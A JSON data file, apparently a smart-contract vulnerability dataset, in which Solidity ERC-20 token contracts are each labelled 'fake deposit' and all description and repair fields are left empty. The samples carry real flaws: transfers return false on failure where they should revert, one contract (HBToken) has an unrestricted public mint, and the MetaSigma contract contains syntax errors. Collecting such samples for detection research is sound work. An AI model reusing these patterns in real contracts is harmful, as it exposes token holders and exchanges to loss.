balances[owner];\r\n    }\r\n    function allowance(address owner, address spender) public view returns (uint remaining) {\r\n        return allowed[owner][spender];\r\n    }\r\n    function transfer(address to, uint256 value) public returns (bool success) {\r\n        if (balances[msg.sender] >= value && value > 0) {\r\n            balances[msg.sender] -= value;\r\n            balances[to] += value;\r\n            emit Transfer(msg.sender, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n    function transferFrom(address from, address to, uint256 value) public returns (bool success) {\r\n        if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\r\n            balances[to] += value;\r\n            balances[from] -= value;\r\n            allowed[from][msg.sender] -= value;\r\n            emit Transfer(from, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n    function approve(address spender, uint256 value) public returns (bool success) {\r\n        allowed[msg.sender][spender] = value;\r\n        emit Approval(msg.sender, spender, value);\r\n        return true;\r\n    }\r\n     function () external payable {\r\n        teamAddress.transfer(msg.value);\r\n    }\r\n    constructor () public payable {\r\n        teamAddress = msg.sender;\r\n        balances[teamAddress] = initialSupply;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "// SPDX-License-Identifier: GPL-3.0\r\n\r\npragma solidity ^0.8.13;\r\n\r\nabstract contract Token {\r\n    uint256 public totalSupply;\r\n    function balanceOf(address _owner) public view virtual returns (uint256 balance);\r\n    function transfer(address _to, uint256 _value) public virtual returns (bool success);\r\n    function transferFrom(address _from, address _to, uint256 _value) public virtual returns (bool success);\r\n    function approve(address _spender, uint256 _value) public virtual returns (bool success);\r\n    function allowance(address _owner, address _spender) public view virtual returns (uint256 remaining);\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n}\r\n\r\n\r\n/*  ERC 20 token */\r\ncontract StandardToken is Token {\r\n\r\n    function transfer(address _to, uint256 _value) public override returns (bool success) {\r\n      if (balances[msg.sender] >= _value && _value > 0) {\r\n        balances[msg.sender] -= _value;\r\n        balances[_to] += _value;\r\n        emit Transfer(msg.sender, _to, _value);\r\n        return true;\r\n      } else {\r\n        return false;\r\n      }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) public override returns (bool success) {\r\n      if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n        balances[_to] += _value;\r\n        balances[_from] -= _value;\r\n        allowed[_from][msg.sender] -= _value;\r\n        emit Transfer(_from, _to, _value);\r\n        return true;\r\n      } else {\r\n        return false;\r\n      }\r\n    }\r\n\r\n    function balanceOf(address _owner) public view override returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) public override returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        emit Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) public view override returns (uint256 remaining) {\r\n      return allowed[_owner][_spender];\r\n    }\r\n\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n}\r\n\r\ncontract HigasasuToken is StandardToken {\r\n\r\n    // metadata\r\n    string public constant name = \"Higasasu Token\";\r\n    string public constant symbol = \"HGSS\";\r\n    uint256 public constant decimals = 18;\r\n    string public version = \"1.0\";\r\n\r\n    // contracts\r\n    address public tokenFundDeposit;      // deposit address for HigasasuToken International use and HGSS User Fund\r\n\r\n    // crowdsale parameters\r\n    uint256 public constant tokenFund = 1 * (10**3) * 10**decimals;   // 1000 HGSS reserved for HigasasuToken Intl use\r\n\r\n    // events\r\n    event CreateHigasasuToken(address indexed _to, uint256 _value);\r\n\r\n    // constructor\r\n    constructor(address _tokenFundDeposit)\r\n    {\r\n      tokenFundDeposit = _tokenFundDeposit;\r\n      totalSupply = tokenFund;\r\n      balances[tokenFundDeposit] = tokenFund;    // Deposit HigasasuToken Intl share\r\n      emit CreateHigasasuToken(tokenFundDeposit, tokenFund);  // logs HigasasuToken Intl fund\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "/**\r\n *Submitted for verification at Etherscan.io on 2022-11-04\r\n*/\r\n\r\n/**\r\n *Submitted for verification at Etherscan.io on 2018-02-27\r\n*/\r\n\r\npragma solidity 0.4.19;\r\n\r\ncontract Token {\r\n\r\n    /// @return total amount of tokens\r\n    function totalSupply() constant returns (uint supply) {}\r\n\r\n    /// @param _owner The address from which the balance will be retrieved\r\n    /// @return The balance\r\n    function balanceOf(address _owner) constant returns (uint balance) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `msg.sender`\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transfer(address _to, uint _value) returns (bool success) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\r\n    /// @param _from The address of the sender\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transferFrom(address _from, address _to, uint _value) returns (bool success) {}\r\n\r\n    /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @param _value The amount of wei to be approved for transfer\r\n    /// @return Whether the approval was successful or not\r\n    function approve(address _spender, uint _value) returns (bool success) {}\r\n\r\n    /// @param _owner The address of the account owning tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @return Amount of remaining tokens allowed to spent\r\n    function allowance(address _owner, address _spender) constant returns (uint remaining) {}\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint _value);\r\n}\r\n\r\ncontract RegularToken is Token {\r\n\r\n    function transfer(address _to, uint _value) returns (bool) {\r\n        //Default assumes totalSupply can't be over max (2^256 - 1).\r\n        if (balances[msg.sender] >= _value && balances[_to] + _value >= balances[_to]) {\r\n            balances[msg.sender] -= _value;\r\n            balances[_to] += _value;\r\n            Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint _value) returns (bool) {\r\n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value >= balances[_to]) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            allowed[_from][msg.sender] -= _value;\r\n            Transfer(_from, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function balanceOf(address _owner) constant returns (uint) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint _value) returns (bool) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) constant returns (uint) {\r\n        return allowed[_owner][_spender];\r\n    }\r\n\r\n    mapping (address => uint) balances;\r\n    mapping (address => mapping (address => uint)) allowed;\r\n    uint public totalSupply;\r\n}\r\n\r\ncontract UnboundedRegularToken is RegularToken {\r\n\r\n    uint constant MAX_UINT = 2**256 - 1;\r\n    \r\n    /// @dev ERC20 transferFrom, modified such that an allowance of MAX_UINT represents an unlimited amount.\r\n    /// @param _from Address to transfer from.\r\n    /// @param _to Address to transfer to.\r\n    /// @param _value Amount to transfer.\r\n    /// @return Success of transfer.\r\n    function transferFrom(address _from, address _to, uint _value)\r\n        public\r\n        returns (bool)\r\n    {\r\n        uint allowance = allowed[_from][msg.sender];\r\n        if (balances[_from] >= _value\r\n            && allowance >= _value\r\n            && balances[_to] + _value >= balances[_to]\r\n        ) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            if (allowance < MAX_UINT) {\r\n                allowed[_from][msg.sender] -= _value;\r\n            }\r\n            Transfer(_from, _to, _value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n}\r\n\r\ncontract HBToken is UnboundedRegularToken {\r\n\r\n    uint public totalSupply = 5*10**26;\r\n    uint8 constant public decimals = 18;\r\n    string constant public name = \"ZFTEST\";\r\n    string constant public symbol = \"ZFT\";\r\n\r\n    function HBToken() {\r\n        balances[msg.sender] = totalSupply;\r\n        Transfer(address(0), msg.sender, totalSupply);\r\n    }\r\n\r\n    function mint(address _to, uint _value) {\r\n       balances[_to] += _value;\r\n       Transfer(address(0), _to, _value);\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.4.18;\r\n//this project is non-profit work.\r\ncontract Token {\r\n    function totalSupply() constant returns (uint256 supply) {}\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {}\r\n    function transfer(address _to, uint256 _value) returns (bool success) {}\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\r\n    function approve(address _spender, uint256 _value) returns (bool success) {}\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n\r\n}\r\n\r\ncontract LJMcontract is Token {\r\n\r\n    function transfer(address _to, uint256 _value) returns (bool success) {\r\n        if (balances[msg.sender] >= _value && _value > 0) {\r\n            balances[msg.sender] -= _value;\r\n            balances[_to] += _value;\r\n            Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\r\n       if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            allowed[_from][msg.sender] -= _value;\r\n            Transfer(_from, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\n      return allowed[_owner][_spender];\r\n    }\r\n\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    uint256 public totalSupply;\r\n}\r\n\r\ncontract LJM is LJMcontract {\r\n    string public name;                   \r\n    uint8 public decimals;                \r\n    string public symbol;                 \r\n    string public version = 'H1.0'; \r\n    uint256 public unitsOneEthCanBuy;     \r\n    uint256 public totalEthInWei;         \r\n    address public fundsWallet;           \r\n\r\n    function LJM() {\r\n        balances[msg.sender] = 1000000000000;              \r\n        totalSupply = 1000000000000;                        \r\n        name = \"President MYONG\";                                   \r\n        decimals = 4;                                               \r\n        symbol = \"LJM\";                                            \r\n        unitsOneEthCanBuy = 1000000;                                \r\n        fundsWallet = msg.sender;                                   \r\n    }\r\n\r\n    function() payable{\r\n        totalEthInWei = totalEthInWei + msg.value;\r\n        uint256 amount = msg.value * unitsOneEthCanBuy/1000000000000000000;\r\n        require(balances[fundsWallet] >= amount);\r\n\r\n        balances[fundsWallet] = balances[fundsWallet] - amount;\r\n        balances[msg.sender] = balances[msg.sender] + amount;\r\n\r\n        Transfer(fundsWallet, msg.sender, amount); \r\n\r\n        fundsWallet.transfer(msg.value);                               \r\n    }\r\n\r\n\r\n    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n\r\n        if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\r\n        return true;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity >=0.4.22 <0.6.0;\r\n\r\ncontract ERC20 {\r\n    function totalSupply() public view returns (uint supply);\r\n    function balanceOf(address who) public view returns (uint value);\r\n    function allowance(address owner, address spender) public view returns (uint remaining);\r\n    function transferFrom(address from, address to, uint value) public returns (bool ok);\r\n    function approve(address spender, uint value) public returns (bool ok);\r\n    function transfer(address to, uint value) public returns (bool ok);\r\n    event Transfer(address indexed from, address indexed to, uint value);\r\n    event Approval(address indexed owner, address indexed spender, uint value);\r\n}\r\n\r\ncontract Clover is ERC20{\r\n    uint8 public constant decimals = 18;\r\n    uint256 initialSupply = 1000000000000000*10**uint256(decimals);\r\n    string public constant name = \"Clover\";\r\n    string public constant symbol = \"\ud83c\udf40\ud83c\udf40\ud83c\udf40\";\r\n\r\n    address payable teamAddress;\r\n\r\n    function totalSupply() public view returns (uint256) {\r\n        return initialSupply;\r\n    }\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    \r\n    function balanceOf(address owner) public view returns (uint256 balance) {\r\n        return balances[owner];\r\n    }\r\n    function allowance(address owner, address spender) public view returns (uint remaining) {\r\n        return allowed[owner][spender];\r\n    }\r\n    function transfer(address to, uint256 value) public returns (bool success) {\r\n        if (balances[msg.sender] >= value && value > 0) {\r\n            balances[msg.sender] -= value;\r\n            balances[to] += value;\r\n            emit Transfer(msg.sender, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n    function transferFrom(address from, address to, uint256 value) public returns (bool success) {\r\n        if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\r\n            balances[to] += value;\r\n            balances[from] -= value;\r\n            allowed[from][msg.sender] -= value;\r\n            emit Transfer(from, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n    function approve(address spender, uint256 value) public returns (bool success) {\r\n        allowed[msg.sender][spender] = value;\r\n        emit Approval(msg.sender, spender, value);\r\n        return true;\r\n    }\r\n     function () external payable {\r\n        teamAddress.transfer(msg.value);\r\n    }\r\n    constructor () public payable {\r\n        teamAddress = msg.sender;\r\n        balances[teamAddress] = initialSupply;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity >=0.4.22 <0.6.0;\r\n\r\ncontract ERC20 {\r\n    function totalSupply() public view returns (uint supply);\r\n    function balanceOf(address who) public view returns (uint value);\r\n    function allowance(address owner, address spender) public view returns (uint remaining);\r\n    function transferFrom(address from, address to, uint value) public returns (bool ok);\r\n    function approve(address spender, uint value) public returns (bool ok);\r\n    function transfer(address to, uint value) public returns (bool ok);\r\n    event Transfer(address indexed from, address indexed to, uint value);\r\n    event Approval(address indexed owner, address indexed spender, uint value);\r\n}\r\n\r\ncontract Oppred is ERC20{\r\n    uint8 public constant decimals = 18;\r\n    uint256 initialSupply = 1000000000000000*10**uint256(decimals);\r\n    string public constant name = \"Oppred\";\r\n    string public constant symbol = \"OPP\";\r\n\r\n    address payable teamAddress;\r\n\r\n    function totalSupply() public view returns (uint256) {\r\n        return initialSupply;\r\n    }\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    \r\n    function balanceOf(address owner) public view returns (uint256 balance) {\r\n        return balances[owner];\r\n    }\r\n    function allowance(address owner, address spender) public view returns (uint remaining) {\r\n        return allowed[owner][spender];\r\n    }\r\n    function transfer(address to, uint256 value) public returns (bool success) {\r\n        if (balances[msg.sender] >= value && value > 0) {\r\n            balances[msg.sender] -= value;\r\n            balances[to] += value;\r\n            emit Transfer(msg.sender, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n    function transferFrom(address from, address to, uint256 value) public returns (bool success) {\r\n        if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\r\n            balances[to] += value;\r\n            balances[from] -= value;\r\n            allowed[from][msg.sender] -= value;\r\n            emit Transfer(from, to, value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n    function approve(address spender, uint256 value) public returns (bool success) {\r\n        allowed[msg.sender][spender] = value;\r\n        emit Approval(msg.sender, spender, value);\r\n        return true;\r\n    }\r\n     function () external payable {\r\n        teamAddress.transfer(msg.value);\r\n    }\r\n    constructor () public payable {\r\n        teamAddress = msg.sender;\r\n        balances[teamAddress] = initialSupply;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "/**\r\n *Submitted for verification at Etherscan.io on 2018-02-27\r\n*/\r\n\r\npragma solidity 0.4.19;\r\n\r\ncontract Token {\r\n\r\n    /// @return total amount of tokens\r\n    function totalSupply() constant returns (uint supply) {}\r\n\r\n    /// @param _owner The address from which the balance will be retrieved\r\n    /// @return The balance\r\n    function balanceOf(address _owner) constant returns (uint balance) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `msg.sender`\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transfer(address _to, uint _value) returns (bool success) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\r\n    /// @param _from The address of the sender\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transferFrom(address _from, address _to, uint _value) returns (bool success) {}\r\n\r\n    /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @param _value The amount of wei to be approved for transfer\r\n    /// @return Whether the approval was successful or not\r\n    function approve(address _spender, uint _value) returns (bool success) {}\r\n\r\n    /// @param _owner The address of the account owning tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @return Amount of remaining tokens allowed to spent\r\n    function allowance(address _owner, address _spender) constant returns (uint remaining) {}\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint _value);\r\n}\r\n\r\ncontract RegularToken is Token {\r\n\r\n    function transfer(address _to, uint _value) returns (bool) {\r\n        //Default assumes totalSupply can't be over max (2^256 - 1).\r\n        if (balances[msg.sender] >= _value && balances[_to] + _value >= balances[_to]) {\r\n            balances[msg.sender] -= _value;\r\n            balances[_to] += _value;\r\n            Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint _value) returns (bool) {\r\n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value >= balances[_to]) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            allowed[_from][msg.sender] -= _value;\r\n            Transfer(_from, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function balanceOf(address _owner) constant returns (uint) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint _value) returns (bool) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) constant returns (uint) {\r\n        return allowed[_owner][_spender];\r\n    }\r\n\r\n    mapping (address => uint) balances;\r\n    mapping (address => mapping (address => uint)) allowed;\r\n    uint public totalSupply;\r\n}\r\n\r\ncontract UnboundedRegularToken is RegularToken {\r\n\r\n    uint constant MAX_UINT = 2**256 - 1;\r\n    \r\n    /// @dev ERC20 transferFrom, modified such that an allowance of MAX_UINT represents an unlimited amount.\r\n    /// @param _from Address to transfer from.\r\n    /// @param _to Address to transfer to.\r\n    /// @param _value Amount to transfer.\r\n    /// @return Success of transfer.\r\n    function transferFrom(address _from, address _to, uint _value)\r\n        public\r\n        returns (bool)\r\n    {\r\n        uint allowance = allowed[_from][msg.sender];\r\n        if (balances[_from] >= _value\r\n            && allowance >= _value\r\n            && balances[_to] + _value >= balances[_to]\r\n        ) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            if (allowance < MAX_UINT) {\r\n                allowed[_from][msg.sender] -= _value;\r\n            }\r\n            Transfer(_from, _to, _value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n}\r\n\r\ncontract IToken is UnboundedRegularToken {\r\n\r\n    uint public totalSupply = 1*10**26;\r\n    uint8 constant public decimals = 18;\r\n    string constant public name = \"Internxt\";\r\n    string constant public symbol = \"INXT\";\r\n\r\n    function IToken() {\r\n        balances[msg.sender] = totalSupply;\r\n        Transfer(address(0), msg.sender, totalSupply);\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "{\"SaoTeamCoin.sol\":{\"content\":\"\\r\\npragma solidity ^0.4.0;\\r\\n\\r\\nimport \\\"./StandardToken.sol\\\";\\r\\n\\r\\ncontract SaoTeamCoin is StandardToken {\\r\\n    function () {\\r\\n        throw;\\r\\n    }\\r\\n\\r\\n    string public name;\\r\\n    uint8 public decimals;\\r\\n    string public symbol;\\r\\n\\r\\n    function SaoTeamCoin(\\r\\n        ) {\\r\\n        balances[msg.sender] = 10000000000000000000000000000;               \\r\\n        totalSupply = 10000000000000000000000000000;                        \\r\\n        name = \\\"S-TEAM Coin\\\";                                   \\r\\n        decimals = 18;                            \\r\\n        symbol = \\\"ST\\\";                               \\r\\n    }\\r\\n\\r\\n    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\\r\\n        allowed[msg.sender][_spender] = _value;\\r\\n        Approval(msg.sender, _spender, _value);\\r\\n\\r\\n        if(!_spender.call(bytes4(bytes32(sha3(\\\"receiveApproval(address,uint256,address,bytes)\\\"))), msg.sender, _value, this, _extraData)) { throw; }\\r\\n        return true;\\r\\n    }\\r\\n}\"},\"StandardToken.sol\":{\"content\":\"\\r\\n\\r\\npragma solidity ^0.4.0;\\r\\n\\r\\nimport \\\"./Token.sol\\\";\\r\\n\\r\\ncontract StandardToken is Token {\\r\\n\\r\\n    function transfer(address _to, uint256 _value) returns (bool success) {\\r\\n        if (balances[msg.sender] \\u003e= _value \\u0026\\u0026 _value \\u003e 0) {\\r\\n            balances[msg.sender] -= _value;\\r\\n            balances[_to] += _value;\\r\\n            Transfer(msg.sender, _to, _value);\\r\\n            return true;\\r\\n        } else { return false; }\\r\\n    }\\r\\n\\r\\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\\r\\n        if (balances[_from] \\u003e= _value \\u0026\\u0026 allowed[_from][msg.sender] \\u003e= _value \\u0026\\u0026 _value \\u003e 0) {\\r\\n            balances[_to] += _value;\\r\\n            balances[_from] -= _value;\\r\\n            allowed[_from][msg.sender] -= _value;\\r\\n            Transfer(_from, _to, _value);\\r\\n            return true;\\r\\n        } else { return false; }\\r\\n    }\\r\\n\\r\\n    function balanceOf(address _owner) constant returns (uint256 balance) {\\r\\n        return balances[_owner];\\r\\n    }\\r\\n\\r\\n    function approve(address _spender, uint256 _value) returns (bool success) {\\r\\n        allowed[msg.sender][_spender] = _value;\\r\\n        Approval(msg.sender, _spender, _value);\\r\\n        return true;\\r\\n    }\\r\\n\\r\\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\\r\\n      return allowed[_owner][_spender];\\r\\n    }\\r\\n\\r\\n    mapping (address =\\u003e uint256) balances;\\r\\n    mapping (address =\\u003e mapping (address =\\u003e uint256)) allowed;\\r\\n    uint256 public totalSupply;\\r\\n}\"},\"Token.sol\":{\"content\":\"pragma solidity ^0.4.0;\\r\\n\\r\\ncontract Token {\\r\\n\\r\\n    function totalSupply() constant returns (uint256 supply) {}\\r\\n    function balanceOf(address _owner) constant returns (uint256 balance) {}\\r\\n    function transfer(address _to, uint256 _value) returns (bool success) {}\\r\\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\\r\\n    function approve(address _spender, uint256 _value) returns (bool success) {}\\r\\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\\r\\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\\r\\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\\r\\n}\"}}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "//SPDX-License-Identifier: SPDX License\r\n// Compatible with version\r\n// of compiler upto 0.6.12\r\npragma solidity ^0.6.12;\r\n\r\n// Creating a Contract\r\ncontract MetaSigma\r\n{\r\n\r\n// Table to map addresses\r\n// to their balance\r\nmapping(address => uint256) balances;\r\n\r\n// Mapping owner address to\r\n// those who are allowed to\r\n// use the contract\r\nmapping(address => mapping (\r\n\t\taddress => uint256)) allowed;\r\n\r\n// totalSupply\r\nuint256 _totalSupply = 122800000*10*18;\r\n\r\n// owner address\r\naddress public owner  = 0x9aBcf7Ea64A1D9eA0e41Cc299989aBe7561A8364\r\n\r\n// Triggered whenever\r\n// approve(address _spender, uint256 _value)\r\n// is called.\r\n;event Approval(address indexed _owner,\r\n\t\t\t\taddress indexed _spender,\r\n\t\t\t\tuint256 _value);\r\n\r\n// Event triggered when\r\n// tokens are transferred.\r\nevent Transfer(address indexed _from,\r\n\t\t\taddress indexed _to,\r\n\t\t\tuint256 _value);\r\n\r\n// totalSupply function\r\nfunction totalSupply()\r\n\t\tpublic view returns (\r\n\t\tuint256 theTotalSupply)\r\n{\r\ntheTotalSupply = _totalSupply;\r\nreturn theTotalSupply;\r\n}\r\n\r\n// balanceOf function\r\nfunction balanceOf(address _owner)\r\n\t\tpublic view returns (\r\n\t\tuint256 balance)\r\n{\r\nreturn balances[_owner];\r\n}\r\n\r\n// function approve\r\nfunction approve(address _spender,\r\n\t\t\t\tuint256 _amount)\r\n\t\t\t\tpublic returns (bool success)\r\n{\r\n\t// If the address is allowed\r\n\t// to spend from this contract\r\nallowed[msg.sender][_spender] = _amount; 6000000*10**18\r\n\t\r\n// Fire the event \"Approval\"\r\n// to execute any logic that\r\n// was listening to it\r\n;emit Approval(msg.sender,\r\n\t\t\t\t_spender, _amount);\r\nreturn true;\r\n}\r\n\r\n// transfer function\r\nfunction transfer(address _to,\r\n\t\t\t\tuint256 _amount)\r\n\t\t\t\tpublic returns (bool success)\r\n{\r\n\t// transfers the value if\r\n\t// balance of sender is\r\n\t// greater than the amount\r\n\tif (balances[msg.sender] >= _amount)\r\n\t{\r\n\t\tbalances[msg.sender] -= _amount;\r\n\t\tbalances[_to] += _amount;\r\n\t\t\r\n\t\t// Fire a transfer event for\r\n\t\t// any logic that is listening\r\n\t\temit Transfer(msg.sender,\r\n\t\t\t\t\t_to, _amount);\r\n\t\t\treturn true;\r\n\t}\r\n\telse\r\n\t{\r\n\t\treturn false;\r\n\t}\r\n}\r\n\r\n\r\n/* The transferFrom method is used for\r\na withdraw workflow, allowing\r\ncontracts to send tokens on\r\nyour behalf, for example to\r\n\"deposit\" to a contract address\r\nand/or to charge fees in sub-currencies;*/\r\nfunction transferFrom(address _from,\r\n\t\t\t\t\taddress _to,\r\n\t\t\t\t\tuint256 _amount)\r\n\t\t\t\t\tpublic returns (bool success)\r\n{\r\nif (balances[_from] >= _amount &&\r\n\tallowed[_from][msg.sender] >=\r\n\t_amount && _amount > 0 &&\r\n\tbalances[_to] + _amount > balances[_to])\r\n{\r\n\t\tbalances[_from] -= _amount;\r\n\t\tbalances[_to] += _amount;\r\n\t\t\r\n\t\t// Fire a Transfer event for\r\n\t\t// any logic that is listening\r\n\t\temit Transfer(_from, _to, _amount);\r\n\treturn true;\r\n\r\n}\r\nelse\r\n{\r\n\treturn false;\r\n}\r\n}\r\n\r\n// Check if address is allowed\r\n// to spend on the owner's behalf\r\nfunction allowance(address _owner,\r\n\t\t\t\taddress _spender)\r\n\t\t\t\tpublic view returns (uint256 remaining)\r\n{\r\nreturn allowed[_owner][_spender];\r\n}\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.4.4;\r\n\r\ncontract ERC20Token {\r\n\r\n    function totalSupply() constant returns (uint256 supply) {}\r\n\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {}\r\n\r\n    function transfer(address _to, uint256 _value) returns (bool success) {}\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\r\n\r\n    function approve(address _spender, uint256 _value) returns (bool success) {}\r\n\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n}\r\n\r\n\r\ncontract Token is ERC20Token {\r\n\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    uint256 public totalSupply;\r\n\r\n    function transfer(address _to, uint256 _value) returns (bool success) {\r\n            if (balances[msg.sender] >= _value && _value > 0) {\r\n                balances[msg.sender] -= _value;\r\n                balances[_to] += _value;\r\n                Transfer(msg.sender, _to, _value);\r\n                return 